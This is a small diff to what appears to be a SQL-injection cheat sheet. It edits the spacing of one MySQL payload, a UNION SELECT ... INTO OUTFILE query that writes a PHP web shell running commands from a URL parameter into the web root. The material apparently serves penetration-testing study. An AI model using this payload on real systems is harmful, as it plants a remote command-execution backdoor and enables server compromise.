@@ -70,7 +70,7 @@ After stuffing the input fields you should either obtain access to the system as
 
 # OR
 
-' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" --
+' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php"--
 ```
 
 #### MSSQL
